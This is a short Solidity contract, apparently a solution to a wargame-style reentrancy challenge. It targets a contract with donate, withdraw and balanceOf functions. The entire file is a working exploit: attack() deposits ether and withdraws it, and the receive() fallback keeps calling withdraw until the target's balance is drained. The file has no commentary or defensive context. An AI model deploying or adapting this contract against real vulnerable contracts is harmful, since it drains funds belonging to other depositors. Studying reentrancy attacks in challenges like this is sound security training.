// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
    function balanceOf(address _who) external view returns (uint256 balance);
}

contract ReentranceAttacker {
    IReentrance private immutable i_reentrance;

    constructor(address _reentrance) public {
        i_reentrance = IReentrance(_reentrance);
    }

    function attack() external payable {
        i_reentrance.donate{value: msg.value}(address(this));
        i_reentrance.withdraw(msg.value);
    }

    receive() external payable {
        uint256 balanceAttacker = i_reentrance.balanceOf(address(this));
        uint256 targetBalance = address(i_reentrance).balance;

        if (balanceAttacker > 0 && targetBalance > 0) {
            uint256 amount = balanceAttacker < targetBalance ? balanceAttacker : targetBalance;

            i_reentrance.withdraw(amount);
        }
    }
}
